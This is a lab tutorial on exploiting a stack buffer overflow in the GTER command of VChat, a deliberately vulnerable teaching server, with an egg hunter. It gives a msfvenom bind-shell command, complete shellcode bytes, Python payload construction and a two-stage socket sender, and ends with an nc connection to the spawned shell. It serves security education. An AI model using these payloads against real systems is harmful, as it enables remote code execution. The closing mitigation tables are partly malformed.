# VChat GTER Exploit: Egg Hunting
> [!NOTE]
> - The following exploit and its procedures are based on an original [Blog](https://fluidattacks.com/blog/vulnserver-gter/) from fluid attacks.
> - Disable Windows *Real-time protection* at *Virus & threat protection* -> *Virus & threat protection settings*.
> - Don't copy the *$* sign when copying and pasting a command in this tutorial.
> - Offsets may vary depending on what version of VChat was compiled, the version of the compiler used, and any compiler flags applied during the compilation process.
___

Not all buffer overflows are created equal. In this exploit, we will be faced with an execution environment with very limited space on the buffer once the overflow has occurred. To circumnavigate this, we will use a technique known as [EggHunting](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf), a [common technique](https://www.rapid7.com/blog/post/2012/07/06/an-example-of-egghunting-to-exploit-cve-2012-0124/): the attacker places a small piece of shellcode into the execution environment specifically onto the stackl; this specific shellcode then proceeds to scan the virtual memory allocated to the process for a *tag*. This *tag* is used to identify where another long malicious shellcode (e.g., a long one) is located and then jumps to that location, continuing execution of the long malicious shellcode.

We use this technique, as it allows us to circumnavigate space constraints on the stack by placing the small egg-hunting shellcode onto the stack, with the much larger exploit placed into another segment of memory in the program, such as the [heap](https://learn.microsoft.com/en-us/cpp/mfc/memory-management-heap-allocation?view=msvc-170) or another stack segment where we have sufficient space.

## EggHunting What is it
EggHunters are delicate applications. They are designed to be small and *safely* search the *entire* virtual memory region allocated to a process [1]. As they are scanning the entire address space of a program, there are a number of ways the EggHunter could crash the process. The first and most apparent reason the egg hunter could crash the process is an attempt to dereference an address that points to an unallocated region of memory. Hence, safety and reliability are a major concern when creating an egg hunter.

The EggHunter works by searching the address space for a four-byte tag *repeated twice*, so a unique and distinct marker of eight bytes total. The tag is repeated twice as the EggHunter itself must contain a copy of the tag and could possibly find itself in its search through the virtual memory [1]. To prevent this misidentification, the EggHunter searches for two contiguous entries of the tag in memory, as this will guarantee that we have found the shell code and not the egg hunter. There is a slight chance of a collision (false positive), but this is unlikely and is outweighed by the optimizations and space efficiency achieved by using the repeated 4-byte value [1].

> [!NOTE]
> An interesting thing to note as described in the original document [1] on egg hunters, is they described how the *tag* value may have to be valid assembler output. That is, the tag should be valid and executable machine code as the Egg Hunting shell code may jump directly into the tag address and start executing. If the tag was not a valid machine code, the program would then crash! However, now, most egg hunters skip over the tag value and jump into the executable code.

EggHunters rely on system calls or exception-handing mechanisms that are specific to the target operating systems to perform their search through the address space safely. On Linux systems, they exploit a set of systemcalls or, in a more obtrusive manner, override the SIGSEGV exception handler [1]. On Windows they exploit a Windows specific feature Structured Exception Handling (SEH) covered in a [later lab](http://www.github.com/daintyjet/VChat_SEH) or system calls as can be done in Linux. This means each egg hunter is generated for a specific operating system, and depending on the method used, they may only work for a particular version of that operating system.


> [!IMPORTANT]
> Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
## VChat Setup and Configuration
This section covers the compilation process and use of the VChat Server. We include instructions for both the original VChat code, which was compiled with MinGW and GCC on Windows, and the newly modified code, which can be compiled with the Visual Studio C++ compiler.

### Visual Studio
<details>
	
1. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun) for the *essfunc* DLL.
2. Build the project, as this contains inline assembly the target DLL file must be compiled as a x86 DLL (32-bits).
3. Copy the Resulting DLL from the *Debug* folder in the [Essfunc Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun/Debug) into the *Debug* folder in the [VChat Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat/Debug)

	<img src="Images/VS-Comp.png">

4. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat) for the *VChat* EXE.
5. Build the Project; our executable will be in the *Debug* folder. You can then launch the executable!
</details>

### Mingw/GCC
<details>
	
Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.
1. Create the essfunc object File.
		```powershell
		# Compile Essfunc Object file
		$ gcc.exe -c essfunc.c
		```
2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.
		```powershell
		# Create a DLL with a static (preferred) base address of 0x62500000
		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
		```
         * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll"; these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux.
         * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc.a" [2].
         * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
         * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"

3. Compile the VChat application.
		```powershell
		# Compile and Link VChat
		$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
		```
         * ```vchat.c```: The source file is "vchat.c".
         * ```-o vchat.exe```: The output file will be the executable "vchat.exe".
         * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll".
</details>
	
## Exploit Process

### Information Collecting
We want to understand the VChat program and how it works in order to effectively exploit it. Before diving into the specific of how VChat behaves the most important information for us is the IP address of the Windows VM that runs VChat and the port number that VChat runs on.

1. **Windows** Launch the VChat application.
	* Click on the VChat Icon in *File Explorer* when it is in the same directory as the essfunc DLL.
	* You can also use the simple [VChatGUI](https://github.com/daintyjet/VChatGUI) program to launch the executable.
2. (Optional) **Linux**: Run NMap.
	```sh
	# Replace the <IP> with the IP of the machine.
	$ nmap -A <IP>
	```
   * We can think of the "-A" flag as aggressive, as it does more than normal scans and is often easily detected.
   * This scan will also attempt to determine the version of the applications; this means when it encounters a non-standard application such as *VChat*, it can take 30 seconds to 1.5 minutes, depending on the speed of the systems involved, to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
   * Example results are shown below:

		<img src="Images/Nmap.png" width=480>

3. **Linux**: As we can see the port ```9999``` is open, we can try accessing it using **Telnet** to send unencrypted communications.
	```
	$ telnet <VChat-IP> <Port>

	# Example
	# telnet 127.0.0.1 9999
	```
   * Once you have connected, try running the ```HELP``` command, this will give us some information regarding the available commands the server processes and the arguments they take. This provides us a starting point for our [*fuzzing*](https://owasp.org/www-community/Fuzzing) work.
   * Exit with ```CTL+]```.
   * An example is shown below:

		<img src="Images/Telnet.png" width=480>

4. **Linux**: We can try a few inputs to the *GTER* command and see if we can get any information. Type *GTER* followed by some additional input as shown below

	<img src="Images/Telnet2.png" width=480>

   * Now, trying every possible combination of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process, as discussed later in the exploitation section.

### Dynamic Analysis
This exploitation phase is where we launch the target application or binary and examine its behavior based on the input we provide. We can do this both using automated fuzzing tools and manually generated inputs. We do this to discover how we can construct a payload to modify VChat's behavior. We want to construct an attack string as follows: `egghunter-shellcode|address-to-overwrite-return-address`, where | means concatenation. Therefore, we need to know how many bytes are required in order to properly pad and align our overflow to overwrite critical sections of data.

#### Launch VChat
1. Open Immunity Debugger

	<img src="Images/I1.png" width=800>

    * Note that you may need to launch it as the *Administrator* this is done by right-clicking the icon found in the Windows search bar or on the desktop as shown below:

	<img src="Images/I1b.png" width = 200>

2. Attach VChat: There are two options!
   1. (Optional) When the VChat is already Running
        1. Click File -> Attach

			<img src="Images/I2a.png" width=200>

		2. Select VChat

			<img src="Images/I2b.png" width=500>

   2. When VChat is not already Running -- This is the most reliable option!
        1. Click File -> Open, Navigate to VChat

			<img src="Images/I3-1.png" width=800>

        2. Click "Debug -> Run"

			<img src="Images/I3-2.png" width=800>

        3. Notice that a Terminal was opened when you clicked "Open". Once opened, you should see the program output in the terminal.

			<img src="Images/I3-3.png" width=800>
3. Ensure that the execution is not paused, click the red arrow (Top Left)

	<img src="Images/I3-4.png" width=800>

#### Fuzzing
We use [boofuzz](https://boofuzz.readthedocs.io/en/stable/index.html) for fuzzing, in which methodologically generated random data is injected into the target. It is hoped that the random data will cause the target to perform erratically, for example, crash. If that happens, bugs are found in the target.

1. Open a terminal on the **Kali Linux Machine**.

Go into the boofuzz folder
```
┌──(kali㉿kali)-[~]
└─$ cd ~/boofuzz
```

Start a boofuzz virtual environment so that it does not interfere with other Pyhting settings.
```                                                                                                                                          
┌──(kali㉿kali)-[~/boofuzz]
└─$ source env/bin/activate
                                                                                                                                          
┌──(env)─(kali㉿kali)-[~/boofuzz]
└─$ 
```

2. Run the fuzzing script [boofuzz-vchat-GTER.py](SourceCode/boofuzz-vchat-GTER.py)

```
python boofuzz-vchat-GTER.py
```
*boofuzz-vchat-GTER.py* works as follows: builds a connection to the target, creates a message template with some fixed fields and a fuzzable field that will change, and then begins to inject the random data case by case into the target. One test case refers to one random message injected into the target.

3. Eventually vchat will crash. Immunity Debugger gives the string that crashes vchat. Find the string in the fuzzing log file.

I do feel it is a bit hard to identify which string actually crashes VChat. It appears even after VChat crashes, its port is still open, maybe because it takes time for the OS to clean the crashed VChat. In this case, it appears two test cases may crash VChat. Take a guess then and try!

#### Further Analysis
1. **Generate a Cyclic Pattern**. We do this so we can tell *where exactly* the return address is located on the stack. We can use the *Metasploit* script [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb) to generate this string. By analyzing the values stored in the register which will be a subset of the generated string after a crash, we can tell where in memory the return address is stored.
	```sh
	$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
	```
	* This will allow us to inject a new return address at that location.
	* The value 400 is chosen due to previous experience and knowledge about the function that handles this command, continuing to use 5000 is perfectly fine too!
 
2. **Modify your exploit code**&mdash;[exploit1.py](./SourceCode/exploit1.py)&mdash;and run it to inject a cyclic pattern into VChat's stack and observe the EIP register, whcih contains 4 bytes from the cyclic pattern such as *41356541*.

3. We can **use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the return address's offset** based on our search string's position in the pattern.
	```sh
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41356541
	```
	* This will return an offset such as *135*.

4. Now modify the exploit program&mdash;[exploit2.py](./SourceCode/exploit2.py)&mdash;and run the exploit against VChat.
   * We do this to validate that we have the correct offset for the return address!

		<img src="Images/exploit2.png" width=600>

		* See that the EIP is a series of the value `0x42` this is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the target program.

7. Open the `Executable Modules` window from the **views** tab in Immunity Debugger. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us which `jmp esp` instruction we should pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and Windows systems.

	<img src="Images/exeModules.png" width=600>

8. Use the command *!mona jmp -r esp -cp nonull -o* in the Immunity Debugger's GUI command line to find some `jmp esp` instructions.

	<img src="Images/jmpEsp.png" width=600>

      * The `-r esp` flag tells *mona.py* to search for the `jmp esp` instruction.
      * The `-cp nonull` flag tells *mona.py* to ignore null values.
      * The `-o` flag tells *mona.py* to ignore OS modules.
      * We can select any output from this.
      * We can see there are nine possible `jmp esp` instructions in the essfunc DLL that we can use, any of the displayed options should work. We will use the last one, *625026D3*.

9. Modify your exploit program&mdash;[exploit3.py](./SourceCode/exploit3.py), we use this to verify that the `jmp esp` address we inject works.
   1. Click on the black button highlighted below, and enter the address we decided in the previous step.

		<img src="Images/go2Addr.png" width=600>

   2. Set a breakpoint at the desired address (right-click on the desired *jmp esp* instruction) in the disassembly window.

   3. Run [exploit3.py](./SourceCode/exploit3.py) till an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
         * Notice that the EIP now points to an essfunc.dll address!

   4. Once the overflow occurs, click the *step over* button.

   5. Notice that we jumped to the stack we just overflowed!


Now that we have all the necessary parts for the creation of an exploit we will discuss what we have done so far, and how we can now expand our efforts to gain a shell in the target machine.

### Exploitation

> [!IMPORTANT]
> Addresses and offsets may vary!

#### Unconditional Jump
As we noted in the previous section, there are **only** *24* bytes of free space after the `jmp esp` instruction is executed. We *cannot* create shellcode that allows remote execution in that limited amount of space. However, we can place instructions in that small segment of memory that will enable us to use the *144* bytes of space allocated to the buffer we overflowed in order to overwrite the return address.

1. We can use the [jump instruction](https://c9x.me/x86/html/file_module_x86_id_147.html) to perform an unconditional jump to an offset relative to the current JUMP instruction's address. The use of a relative offset for the jump is important as we are working within the stack, where addresses may change between calls during it's execution and between the times the process is executed.
2. Perform the exploitation of VChat with [exploit3.py](./SourceCode/exploit3.py) as described in step `8` from the previous section.
3. Scroll up to the start of the buffer we overflowed, we can find this by looking for where the `A`'s start as they have the relatively distinct value of 41 as shown before. In this case the address of our buffer start at `00EBF965` or `00FCF965`.

	<img src="Images/I21.png" width=600>

4. We now want to overwrite the start of the `C` buffer with a `jmp` instruction to continue execution by jumping to the start of our buffer. Right-click the location and click assemble as shown below.

	<img src="Images/I22.png" width=600>

5. Now enter the instruction `jmp 00EBF965` where `00EBF965` may be replaced with your own stack address.

	<img src="Images/I23.png" width=600>

6. Now we can see the newly assembled instruction and step into it to verify that it works!

	<img src="Images/I24.png" width=600>

7. Using the resulting assembly, modify your exploit code to reflect the [exploit4.py](./SourceCode/exploit4.py) script. To get the resulting machine code right click the `jmp` instruction and select binary copy as shown below.

	<img src="Images/I25.png" width=600>

    * You then need to convert the hex digits into what python expects. For example, `E9 66 FF FF FF` becomes `\xe9\x66\xffxff\xff`.

8. Run the [exploit4.py](./SourceCode/exploit4.py) with the breakpoint set at `jmp esp` as was described in  step `8` from the PreExploitation (previous) section. Follow the flow of execution using the *step into* button and make sure we jump to the start of the buffer as expected. That is, after hitting the `jmp esp` breakpoint and clicking the *step into* button *once* you should see the short unconditional `jmp` instruction as shown below. Once you step into the new `jmp` instruction, we should see the start of the buffer.

	<img src="Images/I26.png" width=600>

#### EggHunter Shellcode Generation
Now that we can jump to the start of the buffer, we can make the *EggHunter* Shellcode that will be executed on our system to locate the *egg* our reverse shell.

> [!NOTE]
> If you follow older walkthroughs or use this on newer Windows systems, you may face issues due to changes in the systemcall interface as on Windows, which is quite [unstable](https://j00ru.vexillium.org/syscalls/nt/64/).
>
> Specifically in the case of the jump from Windows 7 to 10 the `INT 2E` instruction no longer being supported in Windows 10 is a reason older egg hunting shellcode may fail [5] [6].
>
> The ```msf-egghunt``` [generation method](https://armoredcode.com/blog/a-closer-look-to-msf-egghunter/) as described in some blog posts **does not work** for VChat when running on Windows 10, as we can see it contains the `INT 2E` interrupt.
>
> <img src="Images/I27.png" width=600>
>
> This was generated using the command `msf-egghunter -p windows -a x86 -f python -e w00t` on a Kali Linux machine.
>*  `-p windows`: Specifies the Windows platform.
>*  `-a x86`: Specifies a x86 target architecture.
>*  `-f python`: format output for a python script.
>*  `-e w00t`: Egg to search for.
   
We can use Immunity Debugger and ```mona.py``` to generate egg hunter shellcode that works.
1. Open Immunity Debugger and use the command `!mona egg -t w00t -wow64 -winver 10`.
    * `!mona`: Use the mona tool.
    * `egg`: Use the EggHunter generation option.
    * `-wow64`: Generate for a 64 bit machine.
    * `-winver 10`: Generate for a Windows 10 machine. Currently, it does not recognize Windows 11 as a valid version.
2. Copy the output shown below to [exploit5.py](./SourceCode/exploit5.py), this can be found in the file `egghunter.txt` file in the folder `C:\Users\<User>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger`, where `<User>` is replaced by your username.

	<img src="Images/I28.png" width=600>

> [!IMPORTANT]
>  The location of the *egghunter.txt* file may change from system to system! You can also use the command `!mona config -set workingfolder C:\logs\E2` to set the folder our output will be saved to.

#### Bind Shellcode Generation and Exploit Setup
Up until this point in time,  we have been performing [Denial of Service](https://attack.mitre.org/techniques/T0814/) (DoS) attacks. Since we simply overflowed the stack with what is effectively garbage address values (a series of `A`s, `B`s, and `C`s), all we have done with our exploits is crash the VChat server directly or indirectly after our jump instructions lead to an invalid operation. Now, we have all the information necessary to control the flow of VChat's execution, allowing us to inject [Shellcode](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) and perform a more meaningful attack.

1. We also need a bind shell. This is a program that listens for connections on the target machine and provides a shell to anyone that makes a tcp connection to the port it is listening on. We can generate the shellcode with the following command.
	```sh
	$ msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
	```
   * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
   * `-p windows/shell_bind_tcp`: Specify we are using the tcp bind shell payload for windows.
     * `RPORT=4444`: Specify the Receiving (Remote) port is 4444.
     * `EXITFUNC=thread`: Exit process, this is running as a thread.
     * `-f`: The output format.
       * `python`: Format for use in python scripts.
     * `-v`: Specify a custom variable name.
     * `SHELL`: Shell Variable name.
     * `-a x86`: Specify the target architecture as `x86`
     * `--platform windows`: Specify the target platform as Windows
     * `-b`: Specifies bad chars and byte values. This is given in the byte values.
       * `\x00\x0a\x0d`: Null char, carriage return, and newline.

2. Modify your exploit code to create a byte array representing the shellcode as shown in [exploit5.py](./SourceCode/exploit5.py), remember to prepend the *tag* repeated twice to the *bind* shellcode as this is what the EggHunter will use to identify the start of the shellcode and jump to it! Below is the shellcode used in the exploit file.
	```py
	SHELL = b"w00tw00t"      # The egghunter will look for this, w00t repeated twice.
	SHELL += b"\xb8\x9c\x02\xc9\x42\xda\xce\xd9\x74\x24\xf4\x5b"
	SHELL += b"\x29\xc9\xb1\x53\x31\x43\x12\x03\x43\x12\x83\x5f"
	SHELL += b"\x06\x2b\xb7\xa3\xef\x29\x38\x5b\xf0\x4d\xb0\xbe"
	SHELL += b"\xc1\x4d\xa6\xcb\x72\x7e\xac\x99\x7e\xf5\xe0\x09"
	SHELL += b"\xf4\x7b\x2d\x3e\xbd\x36\x0b\x71\x3e\x6a\x6f\x10"
	SHELL += b"\xbc\x71\xbc\xf2\xfd\xb9\xb1\xf3\x3a\xa7\x38\xa1"
	SHELL += b"\x93\xa3\xef\x55\x97\xfe\x33\xde\xeb\xef\x33\x03"
	SHELL += b"\xbb\x0e\x15\x92\xb7\x48\xb5\x15\x1b\xe1\xfc\x0d"
	SHELL += b"\x78\xcc\xb7\xa6\x4a\xba\x49\x6e\x83\x43\xe5\x4f"
	SHELL += b"\x2b\xb6\xf7\x88\x8c\x29\x82\xe0\xee\xd4\x95\x37"
	SHELL += b"\x8c\x02\x13\xa3\x36\xc0\x83\x0f\xc6\x05\x55\xc4"
	SHELL += b"\xc4\xe2\x11\x82\xc8\xf5\xf6\xb9\xf5\x7e\xf9\x6d"
	SHELL += b"\x7c\xc4\xde\xa9\x24\x9e\x7f\xe8\x80\x71\x7f\xea"
	SHELL += b"\x6a\x2d\x25\x61\x86\x3a\x54\x28\xcf\x8f\x55\xd2"
	SHELL += b"\x0f\x98\xee\xa1\x3d\x07\x45\x2d\x0e\xc0\x43\xaa"
	SHELL += b"\x71\xfb\x34\x24\x8c\x04\x45\x6d\x4b\x50\x15\x05"
	SHELL += b"\x7a\xd9\xfe\xd5\x83\x0c\x6a\xdd\x22\xff\x89\x20"
	SHELL += b"\x94\xaf\x0d\x8a\x7d\xba\x81\xf5\x9e\xc5\x4b\x9e"
	SHELL += b"\x37\x38\x74\xb1\x9b\xb5\x92\xdb\x33\x90\x0d\x73"
	SHELL += b"\xf6\xc7\x85\xe4\x09\x22\xbe\x82\x42\x24\x79\xad"
	SHELL += b"\x52\x62\x2d\x39\xd9\x61\xe9\x58\xde\xaf\x59\x0d"
	SHELL += b"\x49\x25\x08\x7c\xeb\x3a\x01\x16\x88\xa9\xce\xe6"
	SHELL += b"\xc7\xd1\x58\xb1\x80\x24\x91\x57\x3d\x1e\x0b\x45"
	SHELL += b"\xbc\xc6\x74\xcd\x1b\x3b\x7a\xcc\xee\x07\x58\xde"
	SHELL += b"\x36\x87\xe4\x8a\xe6\xde\xb2\x64\x41\x89\x74\xde"
	SHELL += b"\x1b\x66\xdf\xb6\xda\x44\xe0\xc0\xe2\x80\x96\x2c"
	SHELL += b"\x52\x7d\xef\x53\x5b\xe9\xe7\x2c\x81\x89\x08\xe7"
	SHELL += b"\x01\xa9\xea\x2d\x7c\x42\xb3\xa4\x3d\x0f\x44\x13"
	SHELL += b"\x01\x36\xc7\x91\xfa\xcd\xd7\xd0\xff\x8a\x5f\x09"
	SHELL += b"\x72\x82\x35\x2d\x21\xa3\x1f"
	```
3. Generate shellcode packet (Python). Due to the structure of the VChat server and how it handles connections, our packet containing the *bind* shellcode is a bit more complicated.
   * In some walkthroughs, they do not perform any additional overflows. This is because the original Vulnserver contains memory leaks of sufficient size, where the received data is allocated on the heap and **is not** de-allocated with a `free()` call.
   * In VChat, the sufficiently sized heap allocations are de-allocated. Therefore, we need to perform an overflow in the **GTER** buffer, which can hold the shellcode and prevent the thread handling the **GTER** message from exiting and de-allocating our shellcode.
   * We will perform an overflow as is done in the [TURN exploitation](https://github.com/DaintyJet/VChat_TURN); however, we will add two `JMP` instructions and a [NOP Sled](https://unprotect.it/technique/nop-sled/). The NOP Sled allows us to jump to an arbitrary location in the buffer and fall down into the `JMP` instruction placed before the return address, allowing us to easily create an infinite loop that prevents de-allocation.
   * We can pick an arbitrary location in the buffer to jump to and assemble the instruction as done in `step 1` of the exploitation procedure.
	```py
	PAYLOAD_SHELL = (
    	b'GTER /.:/' +                        # GTER command of the server
    	SHELL +                               # Shell code
    	b'\x90' * (2003 - (len(SHELL) + 5)) + # Padding! We have the shellcode and 5 bytes of the jump we account for

    	# 62501205   FFE4             JMP ESP
    	# Return a bytes object.
    	# Format string '<L': < means little-endian; L means unsigned long
    	b'\xe9\x30\xff\xff\xff' +      # Jump back into NOP sled so we create an infinite loop
    	struct.pack('<L', 0x6250151e)+ # Override Return address, So we can execute on the stack
    	b'\xe9\x30\xff\xff\xff'        # Jump into NOP sled
	)
	```
     * `b'GTER /.:/'`: We are targeting the **GTER** buffer as this has the space we need for the tcp-bind shellcode and the infinite-loop code.
     * `SHELL`: The Shellcode is placed in the buffer. This can be done anywhere, but placing it at the front allows us to avoid accidentally jumping into it.
     * `b'\x90' * (2003 - (len(SHELL) + 5))`: Create a NOP Sled; we do not want to overshoot the return address, so we need to account for the length of the shellcode, and the 5-byte instruction for the `JMP` we will perform.
     * `b'\xe9\x30\xff\xff\xff'`: This is one of the two `JMP` instructions, this is placed before the return address to prevent us from executing the address as an instruction which may lead to a crashed system state.
     * `struct.pack('<L', 0x6250151e)`: A `JMP ESP` address, this is one of the ones we had discovered with the mona.py command `!mona jmp -r esp -cp nonull -o` in Immunity Debugger.
     * `b'\xe9\x30\xff\xff\xff'`: This is one of the two `JMP` instructions, this is placed after the return address so once we take control of the thread when the `JMP ESP` instruction is executed we enter an infinite loop, which prevents us from exiting the function and de-allocating the shellcode we injected for the EggHunter to find.

4. Generate the EggHunter packet (Python).
	```py
	PAYLOAD = (
		b'GTER /.:/' +
		EGGHUNTER +
		b'A' * (143 - len(EGGHUNTER)) +
		# 0x625014dd | FFE4 | jmp esp
		struct.pack('<L', 0x625014dd) +
		# JMP to the start of our buffer
		b'\xe9\x66\xff\xff\xff' +
		# This padding is not strictly needed
		b'C' * (400 - 147 - 4 - 5)
	)
	```
      * `b'GTER /.:/'`: We are overflowing the buffer of the **GTER** command.
      * `EGGHUNTER`: Remember that there is not enough space after the return address for the EggHunter shellcode. So we need to place it at the beginning of the buffer (after the command instruction!).
      * `b'A' * (143 - len(EGGHUNTER))`We need to overflow up but not including to the return address so we can overwrite it, this can be `A`'s as we used here or the NOP (`\x90`) instruction as used for the **GTER** overflow in ```step 5```. Since we have space taken up by the eggHunter's shellcode we do not want to overshoot our target and must take that into account!
      * `struct.pack('<L', 0x625014dd)`: A `JMP ESP` address, this is one of the ones we had discovered with the mona.py command `!mona jmp -r esp -cp nonull -o` in Immunity Debugger. *Notice* that it differs from the one we used in the **GTER** instruction! This is only done so we can observe the two packets more easily by setting breakpoints on two unique `JMP ESP` instructions.
      * `b'\xe9\x66\xff\xff\xff'`: This is the only `JMP` instruction we use in the **GTER** overflow, this is placed after the return address so once we take control of the thread when the `JMP ESP` instruction is executed and we enter the start of the **GTER** buffer to begin executing the eggHunter Shellcode.
      * `b'C' * (400 - 147 - 4 - 5)`: Final padding (May be omitted)
> [!IMPORTANT]
> Be careful about how you align the shellcode in the stack. As the EggHunter uses the *PUSH* instruction it will corrupt itself if it is too close to the end of the buffer where the stack pointer is pointing to.
>
> ![alt text](Images/Crash-image.png)

#### Debugger Verification and Final Exploitation
1. You now need to set up Immunity Debugger so it allows exceptions to occur.
   1. Open Immunity Debugger.
   2. Click Options, and then *Debug Options* as displayed below.

		<img src="Images/I29.png" width=600>

   3. Access the Exceptions Tab, if nothing is showing click any other tab first, then select the Exceptions tab.

		<img src="Images/I30.png" width=600>

   4. Check All options as shown below (and above!).

		<img src="Images/I30.png" width=600>

2. Organize your exploit code as shown in [exploit5.py](./SourceCode/exploit5.py). Here, the discussion will mainly focus on the order in which we send the payloads.
	```py
	with socket.create_connection((HOST, PORT)) as fd:
		print("Connected...")
		print(fd.recv(1024)) # Get welcome message
		print(fd.recv(1024)) # Get "You are user X" message
		print("Sending shellcode:")
		fd.sendall(PAYLOAD_SHELL)
		print("Shellcode has been staged")

	with socket.create_connection((HOST, PORT)) as fd:
		print("Connected...")
		print(fd.recv(1024)) # Get welcome message
		print(fd.recv(1024)) # Get "You are user X" message
		print("Sending first stage:")
		fd.sendall(PAYLOAD)
		print('Done!\nCheck the port 4444 of the victim.\nThis may take a few minuets!')
	```
      * First we send the bind shellcode packet, this is so the "egg" is staged in memory for the EggHunter to find.
      * Next we send the EggHunter payload, once this is sent the EggHunter should start scanning the memory of our VChat process. Give this a few minuets and we should be able to connect to port 4444 on the target machine for a shell.
3. Modify your exploit program to reflect the [exploit5.py](./SourceCode/exploit5.py) script and run it. You should see the following output.

	<img src="Images/I31.png" width=600>

   * If you do not see this, the exploit may have failed. Restart VChat and try again!
   * This can be done against the VChat server attached to Immunity Debugger or against it as a standalone program. Due to resource limitations, we tended to run it detached from the Immunity Debugger.

4.  After a few minutes, we can use the command ```nc <IP> <Port>``` where the `<IP` is the Window machine's IP and `Port` is 4444 (Or whatever you generated the bind shellcode to have). This should connect to the server and acquire a shell as shown below.

	<img src="Images/I32.png" width=600>


## Attack Mitigation Table
In this section, we will discuss the effects a variety of defenses would have on *this specific attack* on the VChat server; specifically we will be discussing their impact on a buffer overflow that directly overwrites a return address and attempts to execute shellcode that has been written to the stack in order to discover a larger section of shellcode that has been placed elsewhere in the program's virtual address space. We will make a note where that these mitigations may be bypassed.

First we will examine the effects individual defenses have on this exploit, and then we will examine the effects a combination of these defenses would have on the VChat exploit.

The mitigations we will be using in the following examination are:
* [Buffer Security Check (GS)](https://github.com/DaintyJet/VChat_Security_Cookies): Security Cookies are inserted on the stack to detect when critical data such as the base pointer, return address or arguments have been overflowed. Integrity is checked on function return.
* [Data Execution Prevention (DEP)](https://github.com/DaintyJet/VChat_DEP_Intro): Uses paged memory protection to mark all non-code (.text) sections as non-executable. This prevents shellcode on the stack or heap from being executed as an exception will be raised.
* [Address Space Layout Randomization (ASLR)](https://github.com/DaintyJet/VChat_ASLR_Intro): This mitigation makes it harder to locate where functions and datastructures are located as their region's starting address will be randomized. This is only done when the process is loaded, and if a DLL has ASLR enabled it will only have it's addresses randomized again when it is no longer in use and has been unloaded from memory.
* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time.
* [SEHOP](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates the integrity of the SEH chain during a runtime check.
* [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are performed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function, or if you are using `C++` virtual functions would be considered indirect calls as you index a table of function pointers.
* [Heap Integrity Validation](https://github.com/DaintyJet/VChat_Heap_Defense): This mitigation verifies the integrity of a heap when operations are performed on the heap itself, such as allocations or frees of heap objects.
### Individual Defenses: VChat Exploit
As this exploit is related to the simple overflow discussed in the [VChat TRUN](https://github.com/DaintyJet/VChat_TRUN) writeup the mitigation strategies have the same effects. As the primary difference between the exploits is what the shellcode we injected onto the stack is doing. As in the *TRUN* exploit, we overwrite the return address in order to begin executing shellcode on the stack; this shellcode in the TRUN exploit directly performs the exploit - in our case, generating a reverse shell. Whereas in this exploit, we inject shellcode that does not directly perform the exploit; it searches the address space for the shellcode that performs the final exploitation and, in this case, generates a bind shell.

|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG) |
|-|-|-|-|-|-|-|-|
|No Effect| | |X |X |X | X| X| X|
|Partial Mitigation| | | | | | | |
|Full Mitigation|X| | | | | | | |
---
|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG) |
|-|-|-|-|-|-|-|-|
|No Effect| | |X |X |X | X| X| X|
|Partial Mitigation| | | | | | | |
|Full Mitigation| |X| | | | | | |
---
|Mitigation Level|Defenses|
|-|-|
